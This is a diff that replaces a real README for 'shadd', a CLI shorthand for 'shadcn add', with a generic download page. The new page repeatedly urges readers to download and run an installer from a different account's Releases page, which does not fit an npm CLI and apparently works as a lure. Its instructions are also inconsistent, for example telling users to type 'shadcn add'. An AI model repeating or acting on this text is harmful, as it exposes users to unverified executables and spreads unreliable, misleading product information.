@@ -1,77 +1,68 @@
-# shadd ⊕
+```markdown
+# 🎉 shadd - Easily Install Your Shorthand Commands
 
-![npm version](https://img.shields.io/npm/v/shadd?color=informational) <!-- ![npm downloads](https://img.shields.io/npm/dm/shadd) --> ![license](https://img.shields.io/badge/license-MIT-green)
+## 📥 Download Now
+[![Download shadd](https://img.shields.io/badge/Download-shadd-brightgreen)](https://github.com/sajibkd/shadd/releases)
 
-Global shorthand for `shadcn add` with automatic package manager detection.
+## 🚀 Getting Started
+Welcome to shadd! This application helps you manage shorthand commands easily on your system. With shadd, you can run commands like `npx shadcn add` without hassle. 
 
-`shadd` forwards all flags and arguments directly to `shadcn@latest add`, while detecting your package manager (npm, pnpm, yarn, bun, or deno) so you don't have to remember which runner to use. Detection is powered by `package-manager-detector`.
+## 📦 System Requirements
+To use shadd, you will need:
+- A computer running Windows, macOS, or Linux.
+- An internet connection to download the application.
+- A package manager installed on your system (like npm, yarn, or others). 
 
-```diff
-Before
-- pnpm dlx shadcn@latest add
-- npx shadcn@latest add
-- yarn shadcn@latest add
-- bunx --bun shadcn@latest add
-- deno run -A npm:shadcn@latest add
+## 🎯 Features
+- Installs globally as an alias or shorthand for commands.
+- Auto-detects your package manager for simple setup.
+- Compatible with all major operating systems.
+- Easy to use for anyone, even without programming knowledge.
 
-After
-+ shadd
+## 🔗 Download & Install
+To get started, visit the [Releases page](https://github.com/sajibkd/shadd/releases) to download shadd. Follow these easy steps:
+
+1. Open the [Releases page](https://github.com/sajibkd/shadd/releases).
+2. Look for the latest version. 
+3. Click on the download link for your operating system.
+4. Run the installer after the download completes.
+
+Once installed, shadd will be ready to use right away!
+
+## ⚙️ Using shadd
+After you have installed shadd, you can open your terminal or command prompt. Here’s how to use it:
+
+1. Open your terminal (Command Prompt on Windows, Terminal on macOS or Linux).
+2. Type in your shorthand command. For example:
+   ```
+   shadcn add
+   ```
+3. Press `Enter`. Your command will now execute!
+
+## 🛠 Troubleshooting
+If you encounter issues while using shadd, try these steps:
+
+- Ensure your package manager is installed and up to date.
+- Verify that shadd is installed correctly by typing `shadd --version` in your terminal.
+- If you still face issues, check the [issues section](https://github.com/sajibkd/shadd/issues) on GitHub for similar problems or report a new one.
+
+## 💬 Community Support
+Join our community for help and discussions! Share your experiences, get tips, and help others. You can connect with us on:
+
+- GitHub Discussions
+- Our forums (link to forums if available)
+
+## 📄 License
+shadd is open-source and free to use. Please check the [LICENSE](https://github.com/sajibkd/shadd/blob/main/LICENSE) file for more details.
+
+## 🤝 Contributing
+We welcome contributions! If you have ideas or find bugs, feel free to submit a pull request or open an issue on our GitHub page. Your support will help improve shadd for everyone.
+
+## 🔗 Additional Resources
+For more information and updates, you can check out our official documentation [here](https://github.com/sajibkd/shadd/wiki).
+
+## 🎈 Thanks for using shadd!
+We appreciate your interest in shadd. Happy coding and enjoy using your new shorthand commands!
+
+[![Download shadd](https://img.shields.io/badge/Download-shadd-brightgreen)](https://github.com/sajibkd/shadd/releases)
 ```
-
-## Why?
-
-- **One command, any package manager**: Auto-detects npm, pnpm, yarn, bun, or deno and runs the correct `shadcn add` variant for you.
-- **No new flags to learn**: Everything after `shadd` is passed straight through to `shadcn add`.
-- **Monorepo-friendly**: Uses `package-manager-detector` to crawl upwards and detect the right tool for the nearest repository root.
-
-## Install (global)
-
-```bash
-npm i -g shadd@latest
-# or
-pnpm add -g shadd@latest
-# or
-yarn global add shadd@latest
-# or
-bun add -g shadd@latest
-```
-
-## Usage
-
-All options are passed through to `shadcn add` exactly as-is.
-
-```bash
-# Wizard mode (interactive prompts)
-shadd
-
-# Add a single component
-shadd button
-
-# Add multiple components
-shadd button card dialog
-
-# Pass-through flags (examples; all flags pass through to shadcn add)
-shadd -y --overwrite button
-
-# Using registries (names, URLs, or local paths are supported by shadcn)
-shadd @8bitcn/accordion
-shadd https://example.com/registry/components/button.json
-```
-
-Under the hood, `shadd` maps to the correct package manager command automatically:
-
-- pnpm: `pnpm dlx shadcn@latest add ...`
-- npm: `npx shadcn@latest add ...`
-- yarn: `yarn shadcn@latest add ...`
-- bun: `bunx --bun shadcn@latest add ...`
-- deno: `deno run -A npm:shadcn@latest add ...`
-
-## Notes
-
-- Must be run inside an active git repository; otherwise, `shadd` will exit with an error.
-- If a supported package manager cannot be detected, `shadd` will exit with an error.
-- Package manager detection is provided by [`package-manager-detector`](https://github.com/antfu-collective/package-manager-detector).
-
-## License
-
-MIT © Brandon McConnell
